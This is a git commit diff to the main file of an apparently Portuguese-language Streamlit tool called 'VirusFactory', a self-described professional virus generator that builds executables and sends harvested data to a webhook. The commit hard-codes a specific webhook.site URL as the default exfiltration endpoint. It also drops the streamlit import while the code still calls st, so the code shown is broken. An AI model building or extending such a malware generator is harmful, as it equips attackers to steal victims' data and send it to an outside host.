4eda78fad78545675f875b3fe3f1373a2111eb46
antonio338854 <tagt2819@gmail.com>
2026-02-14 17:46:46 -0300

    Update webhook URL and improve path handling

--- main.py
+++ main.py
@@ -1,9 +1,14 @@
-import streamlit as st
+import sys
+import os
+
+# Força o Python a olhar na pasta atual
+sys.path.append(os.getcwd())
+
 from generator import generate_virus
 from builder import build_exe
 
 st.title("VirusFactory - Gerador de Vírus Profissional")
-url = st.text_input("Webhook URL para receber dados:", value="https://webhook.site/")
+url = st.text_input("Webhook URL para receber dados:", value="https://webhook.site/5d5e3fb7-1c53-42e0-b16a-494bb972561d")
 name = st.text_input("Nome do vírus:", value="malware")
 
 if st.button("Gerar Vírus"):
